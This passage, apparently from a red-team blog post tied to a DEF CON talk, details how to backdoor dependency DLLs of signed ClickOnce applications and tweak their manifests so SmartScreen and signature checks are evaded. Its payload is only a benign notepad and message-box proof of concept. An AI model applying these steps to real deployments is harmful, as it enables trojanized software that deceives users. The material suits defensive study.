HTTP/1.1\"\n  \"GET /Application%20Files/ClickOnce_1_1_07_13875/Facilities.dll.deploy HTTP/1.1\"\n  \"GET /Application%20Files/ClickOnce_1_1_07_13875/ClickOnce.exe.deploy HTTP/1.1\"\n```\n\nIn some scenarios users may want to interact with ClickOnce applications but are not using Microsoft Edge or Internet Explorer. An appref-ms file can be created that will act similar to an LNK or shortcut file that will contain the URL of the deployment manifest and some other pieces of information.\n\n```image\nAlt: APPREF-MS Example\nDescription: The image displays a URL pointing to a ClickOnce deployment manifest file, formatted as a web link. The URL includes the address 'https://192.168.1.1/files/ClickOnce.application' followed by a fragment '#ClickOnce', and additional parameters indicating 'Culture=neutral' and 'processorArchitecture=msil'. This format is relevant for initiating ClickOnce applications, as it specifies the deployment details necessary for executing a .NET application.\nTranscription: https://192.168.1.1/files/ClickOnce.application##ClickOnce, Culture=neutral, processorArchitecture=msil\n```\n\nDuring the process before all the downloading happens, the System.Deployment DLL will be utilized to run through various checks and ensure the ClickOnce application can properly execute. One important check to note is the .NET application and ClickOnce deployment identities that are configured in the assembly and the deployment manifests.\n\n```image\nAlt: System.Deployment.dll Logic to Parse Manifests\nDescription: The image is a code snippet that appears to be written in C#, showcasing how to handle assembly manifests in the context of ClickOnce deployment. Key components include variable declarations for dependent assemblies and manifest elements, along with a conditional check to validate the identity of the assembly manifest against the dependent assembly's identity. The code highlights the process of managing application and deployment manifests during the ClickOnce application execution.\nTranscription: |\n  DependentAssembly dependentAssembly = (DependentAssembly)dependencyDownloadCookie.ManifestElement;\n  AssemblyManifest deployManifest = dependencyDownloadCookie.DeployManifest;\n  AssemblyManifest appManifest = dependencyDownloadCookie.AppManifest;\n  AssemblyManifest assemblyManifest = new AssemblyManifest(e.FileLocalPath);\n  \n  if (!assemblyManifest.Identity.Matches(dependentAssembly.Identity, true))\n  {\n      throw new InvalidDeploymentException(ExceptionTypes.RefDefValidation, string.Format(CultureInfo.CurrentUICulture, \n      {\n          fileName\n      }));\n  }\n```\n\nCommonly, when crafting an initial access payload and using ClickOnce, you’d go through the process of writing it up in an IDE like Visual Studio and building the ClickOnce application. So what does standard ClickOnce deployment execution look like, using a newly created .NET application?\n\n<iframe allowfullscreen=\"\" class=\"em n fe dz bh\" frameborder=\"0\" height=\"480\" scrolling=\"no\" src=\"https://cdn.embedly.com/widgets/media.html?src=https%3A%2F%2Fwww.youtube.com%2Fembed%2FLU0Ec8Z9JpU%3Ffeature%3Doembed&amp;display_name=YouTube&amp;url=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3DLU0Ec8Z9JpU&amp;image=https%3A%2F%2Fi.ytimg.com%2Fvi%2FLU0Ec8Z9JpU%2Fhqdefault.jpg&amp;key=a19fcc184b9711e1b4764040d3dc5c07&amp;type=text%2Fhtml&amp;schema=youtube\" title=\"Defcon30 ClickOnce - DEMO1\" width=\"854\"></iframe>\n\n---\n\n## Current ClickOnce Weaponization Pressure Points\n\nAs seen in the first demo, we experience a few issues. For instance, Microsoft SmartScreen was triggered. This is because the assembly that ultimately executed with our arbitrary code was compiled recently and had never been seen by SmartScreen before. The reputation for Microsoft SmartScreen can be based on a number of factors such as the hash of the host assembly or the certificate used to sign the assembly.\n\nAchieving arbitrary code execution within the context of an application seen and otherwise trusted by Microsoft SmartScreen or EDR products can decrease likelihood of prevention. Solutions such as application control or whitelisting prevention can be noteworthy when considering how we want to conduct our code execution, especially during initial access attempts. An Extended Validation (EV) code signing certificate can be used to obtain immediate SmartScreen reputation, but the vetting process and price point increase the barrier to entry. When code-signing certificates are used, there are also additional attribution concerns.\n\nGenerally, a ClickOnce deployment can be tedious to make sure “all the stars align” for a successful deployment. Oftentimes people view ClickOnce as tedious to deploy successfully and having many configuration requirements. We hope the next couple sections outline the important fields within ClickOnce manifests to focus on, to assist in reproducing these techniques.\n\n---\n\n## Alleviation of ClickOnce Weaponization Pressure Points\n\nIf legitimate .NET applications make use of ClickOnce, and we can reliably sideload or hijack those .NET applications, why not just backdoor an existing deployment? An existing deployment that already has, lets say, a valid EV code signature and SmartScreen reputation?\n\n> **NOTE:** We will backdoor a dependency of a ClickOnce deployment, not the host assembly itself. We *maintain the valid signature* associated with that host assembly.\n\nIdentifying existing ClickOnce deployments can be as easy as leveraging a couple search engine dorking techniques (or using the ClickonceHunter tool which will be covered later). Several tools can be used throughout this process (e.g. dnSpy, reshacker, mage, sigcheck, etc).\n\n```image\nAlt: Download of ClickOnce Application Discovered from Google\nDescription: The image displays a screenshot showing a file directory structure on the left, indicating files related to a ClickOnce application deployment, including 'publish.htm' and 'setup.exe'. On the right, there is a Google search result for the term 'inurl:publish.htm', showing various links that include prerequisites for running a specific .NET application. The search results display descriptions about required software components, highlighting the potential for identifying ClickOnce deployments online.\nTranscription: |\n  Folder Structure:\n  source\n  └── repos\n      └── Clickonce_Demo1\n          └── clickonce_published\n              ├── Application Files\n              ├── Clickonce_Demo1.application\n              ├── publish.htm\n              └── setup.exe\n  \n  Date modified:\n  - publish.htm: 7/10/2022 12:31 AM\n  - Clickonce_Demo1.application: 7/10/2022 12:31 AM\n  - setup.exe: 7/10/2022 12:31 AM\n  \n  Google Search Results for \"inurl:publish.htm 'The following prerequisites'\":\n  Page 14 of about 1,860 results (0.47 seconds)\n  1. http://[...]/publish\n     Publisher: The following prerequisites are required: Windows Installer 3.1 .NET Framework 3.5 SP1; SQL Server Compact 3.5; if these components are already ...\n  \n  2. http://[...]/publish\n     Publisher: The following prerequisites are required: Microsoft .NET Framework 4.5.2 (x86 and x64); Windows Installer 4.5; if these components are already installed, you can launch ...\n  \n  3. https://[...]\n     Publisher: The following prerequisites are required: Microsoft .NET Framework 4.5.2 (x86 and x64); if these components are already installed, you can launch ...\n```\n\nWe will want to identify sideloading opportunities for dependencies of the target .NET assembly that the ClickOnce deployment will execute. Any way for us to hijack the flow of execution shortly after the application entry point is what we are looking for. Oftentimes this process consists of using dnSpy to decompile the target .NET assembly to understand the execution flow enough to identify a sideload opportunity.\n\nOnce an ideal DLL to backdoor has been identified, use dnSpy to add your code to the target DLL. At this point, the ClickOnce manifests of the deployment you’ve chosen will need to be tweaked to pass their integrity checks. If you cannot identify an ideal sideload opportunity in the existing codepath(s), techniques such as AppDomainManager injection or .NET deserialization abuse can be helpful here.\n\nThe image below is a quick example of what sideloading an existing, signed ClickOnce deployment would look like. First, we find a ClickOnce deployment published online, download it, and verify the assembly that the deployment executes meets our needs (valid code signature, SmartScreen reputation, etc):\n\n```image\nAlt: Example of Signed ClickOnce Application\nDescription: The image displays the properties window of a ClickOnce application file named 'Defcon30_Demo.exe'. On the left, the 'Security' tab shows the signature list, while the right side contains details about the digital certificate used to sign the executable. The certificate information indicates its purpose, which includes ensuring that the software originates from the software publisher and protecting it from alteration after publication. It details the issuer as 'DigiCert SHA2 Assured ID Code Signing CA' and specifies the validity dates of the certificate, from May 17, 2021, to May 21, 2023. This information is relevant for understanding the security measures and integrity of the ClickOnce application.\nTranscription: |\n  Defcon30_Demo.exe Properties\n  7/17/2022 8:04 PM\n  Application\n  238 KB\n  \n  Security\n  General\n  Compatibility\n  Details\n  Previous Versions\n  Digital Signatures\n  \n  Certificate\n  - Signature list\n    Name of signer: [Redacted]\n  \n  Certificate Information\n  This certificate is intended for the following purpose(s):\n  - Ensures software came from software publisher\n  - Protects software from alteration after publication\n  \n  * Refer to the certification authority's statement for details.\n  \n  Issued to: [Redacted]\n  Issued by: DigiCert SHA2 Assured ID Code Signing CA\n  Valid from 5/17/2021 to 5/21/2023\n```\n\nNext we take a look at the references within the signed .NET assembly we want to sideload. A few of the DLLs the assembly uses are not strongly named, which can be helpful in certain situations:\n\n```image\nAlt: Dependencies of Target Assembly\nDescription: The image displays a screenshot of dnSpy, a tool used for decompiling .NET assemblies. In this view, the 'Assembly Explorer' panel is shown, highlighting the references of a .NET assembly. Several assembly references are listed, with particular attention drawn to those that have a null 'PublicKeyToken'. This indicates the assemblies may not be strongly named, which is relevant for possible sideloading opportunities in the context of backdooring ClickOnce applications.\nTranscription: |\n  1. // Facilities, Version=1.1.7.13875, Culture=neutral, PublicKeyToken=null\n  2. // GR.Presentation.Infra, Version=1.1.7.13875, Culture=neutral, PublicKeyToken=null\n  3. // GRBase, Version=1.1.7.13875, Culture=neutral, PublicKeyToken=null\n  4. // GRPrincipal, Version=1.1.7.13875, Culture=neutral, PublicKeyToken=null\n  5. // mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\n  6. // System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\n  7. // System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\n  8. // System.Deployment, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\n  9. // System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\n  10. // WebserviceClients, Version=1.1.7.13875, Culture=neutral, PublicKeyToken=null\n```\n\nUsing DnSpy to begin at the target .NET assembly’s entry point, we follow the code to the first method call of “SetDpiAwareness()”. This function exists within on the the Dlls previously identified:\n\n```image\nAlt: Following the Code Path\nDescription: The image displays a snippet of C# code from a .NET application, specifically showing the 'Main' method of a public static class named 'Program'. The code includes calls to the 'SetDpiAwareness()' method from the 'DpiSettings' class, as well as references to application initialization and user login dialog handling. The highlighted section indicates the location in the code where the 'SetDpiAwareness()' method is invoked, demonstrating the flow of execution for the ClickOnce deployment process discussed in the context.\nTranscription: |\n  public static class Program\n  {\n      // Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00002050\n      [STAThread]\n      public static void Main()\n      {\n          try\n          {\n              DpiSettings.SetDpiAwareness();\n              Application.EnableVisualStyles();\n              Application.SetCompatibleTextRenderingDefault(false);\n              Context.Inicializa();\n              Program.verificaProxy();\n              Program.verificaVersao();\n              FLogin flogin = new FLogin();\n              flogin.ShowDialog();\n              if (flogin.DialogResult != DialogResult.OK)\n              {\n                  Application.Exit();\n              }\n              else\n              {\n                  // Additional code can go here\n              }\n          }\n      }\n  }\n```\n\nWe observe the code within this method and verify it exists within a DLL dependency (not the host .NET assembly):\n\n```image\nAlt: Identified Location to Place Additional Code\nDescription: The image displays a snippet of C# code from a .NET application, specifically a method named 'SetDpiAwareness'. The code is structured in a way that checks the Windows version and sets process DPI awareness accordingly. It includes multiple conditional statements that handle different Windows versions such as Windows 7, 8, 10, and 2008. This code is relevant in the context of the ClickOnce deployment discussion, illustrating a potential point for injecting additional code into a .NET application.\nTranscription: |\n  // Token: 0x060000AD RID: 173 RVA: 0x00005274 File Offset: 0x00003474\n  public static void SetDpiAwareness()\n  {\n      try\n      {\n          string name = WindowsVersion.Name;\n          if (!(name == \"Windows7\") && !(name == \"Windows2008\"))\n          {\n              if (!(name == \"Windows8\") && !(name == \"Windows81\"))\n              {\n                  if (name == \"Windows10\")\n                  {\n                      DpiSettings.SetProcessDpiAwarenessContext(16);\n                  }\n                  else\n                  {\n                      DpiSettings.SetProcessDpiAwareness(0);\n                  }\n              }\n              else\n              {\n                  DpiSettings.SetProcessDPIAware();\n              }\n          }\n      }\n  }\n```\n\nThe additional code we’d like to sideload the ClickOnce deployment with can be added here. For proof-of-concept sake, we will just spawn notepad and prompt with a MessageBox:\n\n```image\nAlt: Adding Code to Target Dependency\nDescription: The image displays a snippet of C# code demonstrating a method called `SetDpiAwareness()`. This method includes functionality to execute arbitrary code by starting 'notepad.exe', displaying a message box indicating 'Malicious Code Executed', and includes logic related to the Windows version. The code is annotated with comments and structured to suggest it is part of a proof-of-concept for backdooring a ClickOnce deployment.\nTranscription: |\n  public static void SetDpiAwareness()\n  {\n      try\n      {\n          Thread.Sleep(1500);\n          Process.Start(\"notepad.exe\");\n          Thread.Sleep(1500);\n          System.Windows.Forms.MessageBox.Show(\"Signed and trusted process executing our arbitrary code.\", \"Malicious Code Executed\", MessageBoxButtons.OK, MessageBoxIcon.Asterisk, MessageBoxDefaultButton.Button1, MessageBoxOptions.DefaultDesktopOnly);\n          Application.Exit;\n      }\n      string name = WindowsVersion.Name;\n      if (!(name == \"Windows7\") && !(name == \"Windows2008\"))\n      {\n          if (!(name == \"Windows8\") && !(name == \"Windows81\"))\n          {\n              if (name == \"Windows10\")\n              {\n                  DpiSettings.SetProcessDpiAwarenessContext(16);\n              }\n          }\n          else\n          {\n              DpiSettings.SetProcessDpiAwareness(0);\n          }\n      }\n  }\n```\n\nAt this point, dnSpy can add your changes to intermediary language (IL) and you will have your backdoored dependency of the target ClickOnce application. Now is a good time to test and make sure the additional code you’ve added properly executes when running the host .NET assembly.\n\n> **NOTE:** We previously thought a prerequisite was targeting only non-strongly named DLLs. We discovered this is not a requirement because modifying a DLL does not modify the PublickeyToken value of the DLL. The PublickeyToken value is in reference to the hash of the assembly’s embedded manifest rather than the code itself. If the manifest is not modified, the PublickeyToken value remains the same and will still be loaded successfully.\n\nNow that we have our sideload of a signed .NET application that is part of an existing ClickOnce deployment, our last step to have a functioning deployment is to tweak the two ClickOnce manifests such that the integrity checks that occur during deployment do not fail. Here’s a few tips that will hopefully speed the process up:\n\n- **publicKeyToken** — this value is required, but can be nulled out by replacing the value with 16 zeros\n- **\\<hash\\>** — this block is optional and can be removed or recalculated (EX: *openssl -dgst -binary -sha1 Program.exe.manifest |openssl enc -base64)*\n- **\\<publisherIdentity\\>** — included if the manifests have been signed, but is optional and can be removed\n\nA noteworthy mention regarding modification of an existing ClickOnce manifest is that if the manifest was signed with a valid certificate, then making these modifications will break that integrity. The difference to the end user is minimal and many legitimate ClickOnce deployments do not sign their manifests at all. We still have control of the prompt observed by the target user, such as “Name” and “From”. A signed vs unsigned look similar to the image below:\n\n```image\nAlt: Difference Between Signed and Unsigned Deployment Manifest\nDescription: The image shows two side-by-side screenshots of security warning dialogs related to the ClickOnce deployment process. On the left, the dialog for an unsigned ClickOnce manifest indicates that the publisher cannot be verified, prompting the user to decide whether to run the application. On the right, the dialog for a signed ClickOnce manifest confirms the installation and shows the publisher's name, providing a more reassuring message for the user. The left dialog uses 'Run' and 'Don't Run' buttons, while the right uses 'Install' and 'Don't Install' buttons, highlighting the difference in user trust based on the signing status of the application.\nTranscription: |\n  Application Run - Security Warning\n  Publisher cannot be verified.\n  Are you sure you want to run this application?\n  \n  Name:\n  From (Hover over the string below to see the full domain):\n  Publisher: Unknown Publisher\n  \n  [Run] [Don't Run]\n  \n  While applications from the Internet can be useful, they can potentially harm your computer. If you do not trust the source, do not run this software. More Information...\n  \n  Unsigned ClickOnce manifest\n  \n  ---\n  \n  Application Install - Security Warning\n  Do you want to install this application?\n  \n  Name:\n  From (Hover over the string below to see the full domain):\n  Publisher:\n  \n  [Install] [Don't Install]\n  \n  While applications from the Internet can be useful, they can potentially harm your computer. If you do not trust the source, do not install this software. More Information...\n  \n  Signed ClickOnce manifest\n```\n\nSo the question posed is this: *Do we really need a code signing certificate to effectively weaponize ClickOnce deployments?*\n\n<iframe allowfullscreen=\"\" class=\"em n fe dz bh\" frameborder=\"0\" height=\"480\" scrolling=\"no\" src=\"https://cdn.embedly.com/widgets/media.html?src=https%3A%2F%2Fwww.youtube.com%2Fembed%2FP_xUIOg32BY%3Ffeature%3Doembed&amp;display_name=YouTube&amp;url=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3DP_xUIOg32BY&amp;image=https%3A%2F%2Fi.ytimg.com%2Fvi%2FP_xUIOg32BY%2Fhqdefault.jpg&amp;key=a19fcc184b9711e1b4764040d3dc5c07&amp;type=text%2Fhtml&amp;schema=youtube\" title=\"Defcon30 ClickOnce - DEMO2\" width=\"854\"></iframe>\n\n---\n\n## Extending Past Existing ClickOnce Deployments\n\nThe number of published ClickOnce deployments easily identifiable through dorking is finite. It’s not a new technology, nor is it the most popular to deploy and update .NET applications. We foresaw this as a potential issue and sought to find a way to take *any* ideal .NET assembly, identify a sideload opportunity, and wrap it up as a new ClickOnce deployment. As it turns out, this was possible, with a few prerequisites.\n\n1. The \\<assemblyIdentity\\> field within the embedded application manifest must *not* exist, or the entire embedded application manifest must not exist (more on this in a bit)\n2. The UAC settings cannot be set to ‘requireAdministrator’ or ‘highestAvailable’\n\n.NET assemblies that meet these prerequisites can be weaponized as backdoored ClickOnce deployments relatively easily. The *System.Deployment* DLL has code that checks the assembly identity which is found in the embedded application manifest. This check cross-references the application manifest’s identity to ensure the identity values are the same. The image below shows what the embedded assembly manifest default identity will be if it is present.\n\n```image\nAlt: Example of Default “assemblyIdentity” Field\nDescription: The image displays an XML manifest file for a ClickOnce application. It includes the assembly identity information, specifying the version and name of the application. The manifest structure is outlined with various XML tags indicating security settings, requested privileges, and compatibility with different Windows versions. It shows an example of how to define application properties and UAC (User Account Control) settings within the manifest.\nTranscription: |\n  <?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n  <assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\">\n    <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>\n    <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">\n      <security>\n        <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">\n          <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>\n        </requestedPrivileges>\n      </security>\n    </trustInfo>\n    <compatibility xmlns=\"urn:schemas-microsoft-com:compatibility.v1\">\n      <application>\n        <!-- This ID below indicates app support for Windows 7 -->\n        <supportedOS Id=\"{351b389a-5d96-4fb4-8e2d-a2440225f93a}\"/>\n        <!-- The ID below indicates app support for Windows Developer Preview and appears to be the latest for Win8 -->\n        <supportedOS Id=\"{4a2f28e3-53b9-4441-ba9c-d69d4a46a36b}\"/>\n        <!-- The ID below indicates app support for Windows Developer Preview and appears to be the latest for Win8 -->\n        <supportedOS Id=\"{1f676c76-80e1-4239-95bb-83d0f6d0da78}\"/>\n      </application>\n    </compatibility>\n  </assembly>\n```\n\nAs you can see the identity contains two pieces of information, the version and the name. The figure below shows what is in the deployment manifest for the identity value. If you look at the difference there is a value of processorArchitecture.\n\n```image\nAlt: ClickOnce Deployment “assemblyIdentity”\nDescription: The image displays an XML snippet of a .NET assembly manifest. It highlights the `<assemblyIdentity>` element, which contains attributes such as `name`, `version`, `language`, and `processorArchitecture`. The `processorArchitecture` attribute is specifically set to \"amd64\", indicating the architecture type for the assembly. This information is crucial in the context of ClickOnce deployments, as it shows the required identity values in the application manifest.\nTranscription: |\n  <?xml version=\"1.0\" encoding=\"utf-8\"?>\n  <asmv1:assembly xsi:schemaLocation=\"urn:schemas-microsoft-com:asm.v1 assembly.adaptive.xsd\" manifestVersion=\"1.0\" xmlns:asmv1=\"urn:schemas-microsoft-com:asm.v1\">\n      <asmv1:assemblyIdentity name=\"CasPol.exe\" version=\"1.0.0.0\" publicKeyToken=\"0000000000000000\" language=\"neutral\" processorArchitecture=\"amd64\"/>\n      <application />\n      <entryPoint>\n          <asmv1:assemblyIdentity name=\"MyApplication.app\" version=\"1.0.0.0\" language=\"neutral\" processorArchitecture=\"amd64\"/>\n          <commandLine file=\"CasPol.exe\" parameters=\"\" />\n      </entryPoint>\n  </asmv1:assembly>\n```\n\nThe ‘*processorArchitecture*’ value is a required value to be present for the assembly identity in the deployment manifest.\n\n```image\nAlt: MSDN Documentation Showing Required Values\nDescription: The image presents a table detailing the elements and attributes required for the 'assemblyIdentity' element in a ClickOnce deployment. It includes columns for 'Attribute' and 'Description,' listing attributes such as 'Name,' 'Version,' 'publicKeyToken,' and a highlighted entry for 'processorArchitecture,' which is marked as required. The table emphasizes that the 'assemblyIdentity' must contain no child elements and specifies the necessary attributes for proper identification of the application.\nTranscription: |\n  | Attribute             | Description                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |\n  | --------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |\n  | Name                  | Required. Identifies the name of the application. If Name contains special characters, such as single or double quotes, the application may fail to activate.                                                                                                                                                                                                                                                                                                                |\n  | Version               | Required. Specifies the version number of the application in the following format: major.minor.build.revision                                                                                                                                                                                                                                                                                                                                                                |\n  | publicKeyToken        | Optional. Specifies a 16-character hexadecimal string that represents the last 8 bytes of the SHA-1 hash value of the public key under which the application or assembly is signed. The public key that is used to sign the catalog must be 2048 bits or greater. Although signing an assembly is recommended but optional, this attribute is required. If an assembly is unsigned, you should copy a value from a self-signed assembly or use a \"dummy\" value of all zeros. |\n  | processorArchitecture | Required. Specifies the processor. The valid values are msil for all processors, x86 for 32-bit Windows, IA64 for 64-bit Windows, and Itanium for Intel 64-bit Itanium processors.                                                                                                                                                                                                                                                                                           |\n  | language              | Required. Identifies the two part language codes (for example, en-US) of the assembly. This element is in the asmv2 namespace. If unspecified, the default is neutral.                                                                                                                                                                                                                                                                                                       |\n```\n\nThese two values are checked against each other to validate assembly identities are the same. If the default identity value is present in the assembly’s embedded manifest it will fail because there is no ‘*processorArchitecture*’ value present. Therefore, this type of assembly is not possible to use as a ClickOnce application for our purposes. Modifying this value would require modifying the host assembly of our code execution, losing any benefit of a valid code-signature or reputations with Microsoft SmartScreen.\n\n```image\nAlt: System.Deployment dll Checking Identities\nDescription: The image shows a code snippet from a .NET application, specifically a method named 'Matches' which checks if the identity attributes of a reference identity match exactly with the current object's identity attributes. The code includes comments about tokens and attributes related to identity, along with a view of local variables that highlight the values of 'this', 'refId', and 'exact', providing context to the matching process for application identities in the ClickOnce deployment environment.\nTranscription: |\n  public bool Matches(ReferenceIdentity refId, bool exact)\n  {\n      return IsolationInterop.IdentityAuthority.DoesDefinitionMatchReference(exact ? 1U : 0U, this._idComPtr, refId.ComPointer) && this.Version == refId.Version;\n  }\n  \n  // Token: 0x17000158 RID: 344\n  // (get) Token: 0x60000418 RID: 1048 RVA: 0x0000AC14 File Offset: 0x0000AC14\n  public IDENTITY_ATTRIBUTE[] Attributes\n  {\n      get\n      {\n          IEnumIDENTITY_ATTRIBUTE enumIDENTITY_ATTRIBUTE = null;\n          IDENTITY_ATTRIBUTE[] result;\n      }\n  }\n  \n  Locals\n  this: {MyApplication.app, Version=1.0.0.0, Culture=neutral}\n  refId: {MyApplication.app, Version=1.0.0.0, Culture=neutral, processorArchitecture=amd64}\n  exact: true\n```\n\nFortunately there are a lot of assemblies that exist which do not have an identity in the application’s manifest. In the next section we will show how to identify these assemblies, but in the meantime, the figure below shows what an embedded manifest looks like when the default identity is not set, and a non-default manifest was used during the build process instead.\n\n```\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<asmv1:assembly manifestVersion=\"1.0\" xmlns=\"urn:schemas-microsoft-com:asm.v1\" xmlns:asmv1=\"urn:schemas-microsoft-com:asm.v1\" xmlns:asmv2=\"urn:schemas-microsoft-com:asm.v2\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">\n  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">\n    <security>\n      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">\n        <!-- UAC Manifest Options\n            If you want to change the Windows User Account Control level replace the\n            requestedExecutionLevel node with one of the following.\n\n            <requestedExecutionLevel  level=\"asInvoker\" uiAccess=\"false\" />\n            <requestedExecutionLevel  level=\"requireAdministrator\" uiAccess=\"false\" />\n            <requestedExecutionLevel  level=\"highestAvailable\" uiAccess=\"false\" />\n\n            Specifying requestedExecutionLevel node will disable file and registry virtualization.\n            If you want to utilize File and Registry Virtualization for backward\n            compatibility then delete the requestedExecutionLevel node.\n        -->\n        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\" />\n      </requestedPrivileges>\n    </security>\n  </trustInfo>\n\n  <compatibility xmlns=\"urn:schemas-microsoft-com:compatibility.v1\">\n    <application>\n      <!-- A list of all Windows versions that this application is designed to work with.\n      Windows will automatically select the most compatible environment.-->\n\n      <!-- If your application is designed to work with Windows 7, uncomment the following supportedOS node-->\n      <supportedOS Id=\"{35138b9a-5d96-4fbd-8e2d-a2440225f93a}\"/>\n\n      <!-- If your application is designed to work with Windows 8, uncomment the following supportedOS node-->\n      <supportedOS Id=\"{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}\"/>\n\n      <!-- If your application is designed to work with Windows 8.1, uncomment the following supportedOS node-->\n      <supportedOS Id=\"{1f676c76-80e1-4239-95bb-83d0f6d0da78}\"/>\n\n      <!-- This Id value indicates the application supports Windows Threshold functionality-->\n      <supportedOS Id=\"{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}\"/>\n    </application>\n  </compatibility>\n</asmv1:assembly>\n```\n\nThe second condition that is required is for the UAC settings to not be requiredAdministrator or highestAvailable. Another check by the System.Deployment DLL is it will look for the UAC settings and return errors if the disallowed values are set.\n\n```image\nAlt: UAC Check in System.Deployment DLL\nDescription: The image displays a portion of C# code related to verifying requested privileges for a ClickOnce deployment. It includes methods for checking the User Account Control (UAC) settings and registry values associated with the application's execution level. Key components of the code involve logging, accessing the registry, and throwing exceptions based on the execution level conditions.\nTranscription: |\n  private static void VerifyRequestedPrivilegesSupport(string requestedExecutionLevel)\n  {\n      Logger.AddMethodCall(\"VerifyRequestedPrivilegesSupport(\" + requestedExecutionLevel + \") called.\");\n      if (PlatformSpecific.OnVistaOrAbove)\n      {\n          bool flag = false;\n          RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System\");\n          if (registryKey != null && registryKey.GetValue(\"EnableLUA\") == null)\n          {\n              Logger.AddInternalState(\"LUA policy key = \" + registryKey.Name);\n              int num = (int)registryKey.GetValue(\"EnableLUA\");\n              if (num == 0)\n                  flag = true;\n              Logger.AddInternalState(\"LUA is enabled.\");\n          }\n          if (flag && (string.Compare(requestedExecutionLevel, \"requireAdministrator\", StringComparison.OrdinalIgnoreCase) == 0 || string.Compare(requestedExecutionLevel, \"highestAvailable\", StringComparison.OrdinalIgnoreCase) == 0))\n          {\n              throw new InvalidDeploymentException(ExceptionTypes.UnsupportedElevationRequest, string.Format(CultureInfo.CurrentUICulture, Resources.GetString(\"Ex_ManifestExecutionLevelNotSupported\"), new object[0]));\n          }\n      }\n  }\n```\n\nIf UAC information exists, or it is set to ‘asInvoker’ the assembly will work as a ClickOnce deployment.\n\n```image\nAlt: Assembly with No UAC Information\nDescription: The image depicts a user interface of a manifest editor or viewer, showing the XML structure of a ClickOnce application manifest. It highlights the assembly identity, specifying details such as the name, version, processor architecture, and public key token of a dependent assembly. The layout includes a tree view on the left with sections for version information and the manifest, while the main area displays the XML code, indicating the technical details necessary for .NET application deployment.\nTranscription: |\n  <?xml version=\"1.0\" encoding=\"utf-8\"?>\n  <assembly manifestVersion=\"1.0\" xmlns=\"urn:schemas-microsoft-com:asm.v1\">\n    <!-- Enable themes for Windows common controls and dialogs (Windows XP and later) -->\n    <dependency>\n      <dependentAssembly>\n        <assemblyIdentity\n          type=\"win32\"\n          name=\"Microsoft.Windows.Common-Controls\"\n          version=\"6.0.0.0\"\n          processorArchitecture=\"*\"\n          publicKeyToken=\"********\"\n          language=\"*\"\n        />\n      </dependentAssembly>\n    </dependency>\n  </assembly>\n```\n\nSince we are creating ClickOnce applications from scratch, we will have to create new manifests as opposed to our previous weaponization of modifying existing ClickOnce manifests. Microsoft has a utility that is used for this specific task which is called the Manifest Generation and Editing Tool (Mage). Microsoft makes two different tools that can be used, MageUI and Mage. Mage is a command line tool that comes part of the Windows SDK and for the purpose of this blog will be the one we cover.\n\nOnce you have gone through the process of identifying a .NET assembly that can be wrapped up as a ClickOnce deployment, you will want to create the directory structure of the assembly, dependencies, and extra files. As previously mentioned, there are two manifests that will need to be created with Mage — the deployment manifest and the application manifest. The application manifest can be created with the following command:\n\n```\n\"C:\\Program Files (x86)\\Microsoft SDKs\\Windows\\v10.0A\\bin\\NETFX 4.8 Tools\\mage.exe\" -New Application -Processor amd64 -ToFile AppVStreamingUX.exe.manifest -name \"TargetApp\" -Version 1.0.0.0 -FromDirectory .\n```\n\nNext you will need to create the deployment manifest. This can be done with the following command:\n\n```\n\"C:\\Program Files (x86)\\Microsoft SDKs\\Windows\\v10.0A\\bin\\NETFX 4.8 Tools\\mage.exe\" -New Deployment -Processor amd64 -Install false -ProviderUrl \"http://localhost/dist/TargetApp.application\" -AppManifest TargetApp.exe.manifest -ToFile TargetApp.application\n```\n\nThe *ProviderUrl* argument is the location where the deployment manifest will be hosted since the primary method we’re covering is web-based applications. Once the manifests are created, you will see there are some signature values that are created with *Mage*. Just like what was covered when editing existing manifests, these values are not always required and can be removed. If any changes are made to the overall deployment, the signatures will be invalidated and will have to be regenerated which can lead to unnecessary troubleshooting. As mentioned previously, these values are:\n\n- **\\<publicKeyToken\\>**, required but can be nulled with 16 zeros\n- **\\<hash\\>** block can be removed altogether and not required\n- **Publisher identity** block can be removed altogether\n\nNow that we have identified an existing signed .NET assembly that can be deployed as a ClickOnce application, we can go through the same backdoor steps as the other technique. We will follow the code paths, identify called DLLs, and place our code inside of those DLLs. Finally, we can create the manifests with Mage and are ready for deployment.\n\n<iframe allowfullscreen=\"\" class=\"em n fe dz bh\" frameborder=\"0\" height=\"480\" scrolling=\"no\" 